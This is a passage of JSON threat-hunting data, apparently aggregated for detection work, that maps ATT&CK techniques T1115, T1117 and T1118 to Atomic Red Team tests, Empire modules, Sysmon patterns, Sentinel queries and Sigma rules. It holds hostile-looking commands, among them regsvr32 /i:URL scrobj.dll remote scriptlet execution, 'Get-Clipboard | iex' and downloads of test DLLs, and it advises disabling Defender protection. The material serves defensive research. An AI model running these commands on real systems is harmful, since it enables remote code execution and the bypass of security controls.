"", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "clipboard_data", "mitre_attack": "T1115", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100130", "os": "windows", "parent_process": "powershell.exe", "commandline_string": "echo Get-Process | clip", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "clipboard_data", "mitre_attack": "T1115", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100131", "os": "windows", "parent_process": "powershell.exe", "commandline_string": "echo Get-Process | clip", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "clipboard_data", "mitre_attack": "T1115", "itw_sample": ""}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/collection/clipboard_monitor", "ATT&CK Technique #1": "T1115", "ATT&CK Technique #2": "", "Technique": "Clipboard Data", "Concatenate for Python Dictionary": "\"powershell/collection/clipboard_monitor\":  [\"T1115\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/collection/osx/clipboard", "ATT&CK Technique #1": "T1115", "ATT&CK Technique #2": "", "Technique": "Clipboard Data", "Concatenate for Python Dictionary": "\"python/collection/osx/clipboard\":  [\"T1115\"],"}}], "command_list": ["dir | clip\necho \"T1115\" > %temp%\\T1115.txt\nclip < %temp%\\T1115.txt\n", "echo Get-Process | clip\nGet-Clipboard | iex\n", {"darwin": {"sh": {"command": "pbpaste\n"}}, "windows": {"psh,pwsh": {"command": "Get-Clipboard -raw\n"}}, "linux": {"sh": {"command": "xclip -o\n"}}}, "cmd.exe <command> | clip", "cmd.exe clip < readme.txt", "powershell.exe echo Get-Process | clip", "powershell.exe echo Get-Process | clip", "powershell/collection/clipboard_monitor", "powershell/collection/clipboard_monitor", "python/collection/osx/clipboard", "python/collection/osx/clipboard"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains \"clip.exe\"or process_command_line contains \"*Get-Clipboard*\")", "name": "Clipboard Data"}], "possible_detections": []}, {"technique_id": "T1117", "commands": [{"source": "atomics/T1117/T1117.yaml", "command": "regsvr32.exe /s /u /i:PathToAtomicsFolder\\T1117\\src\\RegSvr32.sct scrobj.dll\n", "name": null}, {"source": "atomics/T1117/T1117.yaml", "command": "regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/src/RegSvr32.sct scrobj.dll\n", "name": null}, {"source": "atomics/T1117/T1117.yaml", "command": "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s PathToAtomicsFolder\\T1117\\bin\\AllTheThingsx86.dll) ELSE ( regsvr32.exe /s PathToAtomicsFolder\\T1117\\bin\\AllTheThingsx86.dll )\n", "name": null}, {"source": "Threat Hunting Tables", "command": "excel.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "regsvr32.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "mshta.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "regsvr32.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "odbcconf.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "regsvr32.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "powerpoint.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "regsvr32.exe", "name": "sub_process_1"}, {"source": "Threat Hunting Tables", "command": "reg32svr.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "regsvr32.exe /i (http:|ftp:)", "name": null}, {"source": "Threat Hunting Tables", "command": "scrobj.dll", "name": "loaded_dll"}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "regsvr32.exe", "name": "sub_process_1"}, {"source": "SysmonHunter - Regsvr32", "command": "\\\\Windows\\\\.+\\\\regsvr32.exe/s|/i", "name": null}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Log\nEventID: 1\nImage: C: \\ Windows \\ System32 \\ regsvr32.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Microsoft (C) Register Server\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: REGSVR32.EXE\nCommandLine: regsvr32 / s / n / u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.sct scrobj.dll\n# Sysmon log", "name": "Log"}], "parsed_datasets": [{"Atomic Red Team Test - Regsvr32": {"attack_technique": "T1117", "display_name": "Regsvr32", "atomic_tests": [{"name": "Regsvr32 local COM scriptlet execution", "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n", "supported_platforms": ["windows"], "input_arguments": {"filename": {"description": "Name of the local file, include path.", "type": "Path", "default": "PathToAtomicsFolder\\T1117\\src\\RegSvr32.sct"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Regsvr32.sct must exist on disk at specified location (#{filename})\n", "prereq_command": "if (Test-Path #{filename}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1117/src/RegSvr32.sct\" -OutFile \"#{filename}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "regsvr32.exe /s /u /i:#{filename} scrobj.dll\n"}}, {"name": "Regsvr32 remote COM scriptlet execution", "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable\nwindows defender real-time protection to fix it. Upon execution, calc.exe will be launched.\n", "supported_platforms": ["windows"], "input_arguments": {"url": {"description": "URL to hosted sct file", "type": "Url", "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/src/RegSvr32.sct"}}, "executor": {"name": "command_prompt", "elevation_required": false, "command": "regsvr32.exe /s /u /i:#{url} scrobj.dll\n"}}, {"name": "Regsvr32 local DLL execution", "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n", "supported_platforms": ["windows"], "input_arguments": {"dll_name": {"description": "Name of DLL to Execute, DLL Should export DllRegisterServer", "type": "Path", "default": "PathToAtomicsFolder\\T1117\\bin\\AllTheThingsx86.dll"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})\n", "prereq_command": "if (Test-Path #{dll_name}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory (split-path #{dll_name}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1117/bin/AllTheThingsx86.dll\" -OutFile \"#{dll_name}\"\n"}], "executor": {"name": "command_prompt", "elevation_required": false, "command": "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s #{dll_name}) ELSE ( regsvr32.exe /s #{dll_name} )\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100032", "os": "windows", "parent_process": "excel.exe", "commandline_string": "", "sub_process_1": "regsvr32.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "regsvr32", "mitre_attack": "T1117", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100046", "os": "windows", "parent_process": "mshta.exe", "commandline_string": "", "sub_process_1": "regsvr32.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "regsvr32", "mitre_attack": "T1117", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100055", "os": "windows", "parent_process": "odbcconf.exe", "commandline_string": "", "sub_process_1": "regsvr32.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "regsvr32", "mitre_attack": "T1117", "itw_sample": "ccb1fa5cdbc402b912b01a1838c1f13e95e9392b3ab6cc5f28277c012b0759f9"}}, {"Threat Hunting Tables": {"chain_id": "100063", "os": "windows", "parent_process": "powerpoint.exe", "commandline_string": "", "sub_process_1": "regsvr32.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "regsvr32", "mitre_attack": "T1117", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100069", "os": "windows", "parent_process": "reg32svr.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "", "mitre_attack": "T1117", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100070", "os": "windows", "parent_process": "regsvr32.exe", "commandline_string": "/i (http:|ftp:)", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "scrobj.dll", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "reg32svr", "mitre_attack": "T1117", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100095", "os": "windows", "parent_process": "winword.exe", "commandline_string": "", "sub_process_1": "regsvr32.exe", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "regsvr32", "mitre_attack": "T1117", "itw_sample": ""}}, {"SysmonHunter - T1117": {"name": "Regsvr32", "description": null, "level": "medium", "phase": "Execution", "query": [{"type": "process", "process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\regsvr32.exe", "flag": "regex"}, "cmdline": {"pattern": "/s|/i", "op": "and"}}}]}}], "command_list": ["regsvr32.exe /s /u /i:PathToAtomicsFolder\\T1117\\src\\RegSvr32.sct scrobj.dll\n", "regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/src/RegSvr32.sct scrobj.dll\n", "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s PathToAtomicsFolder\\T1117\\bin\\AllTheThingsx86.dll) ELSE ( regsvr32.exe /s PathToAtomicsFolder\\T1117\\bin\\AllTheThingsx86.dll )\n", "excel.exe", "regsvr32.exe", "mshta.exe", "regsvr32.exe", "odbcconf.exe", "regsvr32.exe", "powerpoint.exe", "regsvr32.exe", "reg32svr.exe", "regsvr32.exe /i (http:|ftp:)", "scrobj.dll", "winword.exe", "regsvr32.exe", "\\\\Windows\\\\.+\\\\regsvr32.exe/s|/i", "Log\nEventID: 1\nImage: C: \\ Windows \\ System32 \\ regsvr32.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Microsoft (C) Register Server\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: REGSVR32.EXE\nCommandLine: regsvr32 / s / n / u /i:http://192.168.126.146:8080/06Yud7aXXqYqT.sct scrobj.dll\n# Sysmon log"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains \"regsvr32.exe\"or process_path contains \"rundll32.exe\"or process_path contains \"certutil.exe\")or process_command_line contains \"scrobj.dll\"", "name": "Bypassing Application Whitelisting With Regsvr32"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 3 and (process_parent_path contains \"\\\\regsvr32.exe\"or process_path contains \"\\\\regsvr32.exe\")", "name": "Regsvr32 Network"}], "possible_detections": [{"data_source": {"title": "BlueMashroom DLL Load", "id": "bd70d3f8-e60e-4d25-89f0-0b5a9cff20e0", "status": "experimental", "description": "Detects a suspicious DLL loading from AppData Local path as described in BlueMashroom report", "references": ["https://www.virusbulletin.com/conference/vb2019/abstracts/apt-cases-exploiting-vulnerabilities-region-specific-software"], "tags": ["attack.defense_evasion", "attack.t1117"], "author": "Florian Roth", "date": "2019/10/02", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["*\\regsvr32*\\AppData\\Local\\\\*", "*\\AppData\\Local\\\\*,DllEntry*"]}, "condition": "selection"}, "falsepositives": ["Unlikely"], "level": "critical"}}, {"data_source": {"title": "Regsvr32 Anomaly", "id": "8e2b24c9-4add-46a0-b4bb-0057b4e6187d", "status": "experimental", "description": "Detects various anomalies in relation to regsvr32.exe", "author": "Florian Roth", "references": ["https://subt0x10.blogspot.de/2017/04/bypass-application-whitelisting-script.html"], "tags": ["attack.t1117", "attack.defense_evasion", "attack.execution", "car.2019-04-002", "car.2019-04-003"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection1": {"Image": "*\\regsvr32.exe", "CommandLine": "*\\Temp\\\\*"}, "selection2": {"Image": "*\\regsvr32.exe", "ParentImage": "*\\powershell.exe"}, "selection3": {"Image": "*\\regsvr32.exe", "CommandLine": ["*/i:http* scrobj.dll", "*/i:ftp* scrobj.dll"]}, "selection4": {"Image": "*\\wscript.exe", "ParentImage": "*\\regsvr32.exe"}, "selection5": {"Image": "*\\EXCEL.EXE", "CommandLine": "*..\\..\\..\\Windows\\System32\\regsvr32.exe *"}, "condition": "1 of them"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Unknown"], "level": "high"}}]}, {"technique_id": "T1118", "commands": [{"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"T1118.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'CheckIfInstallable'\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"T1118.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'InstallHelper'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"T1118.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = 'Executable'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. PathToAtomicsFolder\\T1118\\src\\InstallUtilTestHarness.ps1\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Install_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Install_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"T1118.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Install_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName = $InstallerAssemblyFileName\n    InvocationMethod = '#{invocation_method}'\n    CommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n    throw @\"\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n", "name": null}, {"source": "atomics/T1118/T1118.yaml", "command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. #{test_harness}\n\n$InstallerAssemblyDir = \"#{assembly_dir}\"\n$InstallerAssemblyFileName = \"#{assembly_filename}\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Install_'\n\n$TestArgs = @{\n    OutputAssemblyDirectory = $InstallerAssemblyDir\n    OutputAssemblyFileName 